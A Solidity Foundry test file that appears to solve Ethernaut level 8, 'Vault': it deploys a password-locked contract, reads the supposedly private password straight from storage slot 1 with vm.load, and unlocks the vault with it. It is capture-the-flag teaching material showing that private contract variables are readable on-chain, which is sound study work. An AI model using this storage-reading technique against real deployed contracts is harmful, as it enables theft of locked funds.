// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../../src/ethernaut-008-vault/Vault.sol";

contract VaultTest is Test {
    Vault public vault;
    bytes32 public password;

    function setUp() public {
        password = bytes32("supersecretpassword");
        vault = new Vault(password);
    }

    function test_vault() public {
        // Verify locked
        assertEq(vault.locked(), true);

        // Read private storage directly!
        // slot 0 = locked, slot 1 = password
        bytes32 storedPassword = vm.load(
            address(vault),
            bytes32(uint256(1)) // slot 1
        );

        console.log("Password found:");
        console.logBytes32(storedPassword);

        // Unlock with stolen password
        vault.unlock(storedPassword);

        // Verify unlocked
        assertEq(vault.locked(), false);
        console.log("Vault unlocked!", vault.locked());
    }
}
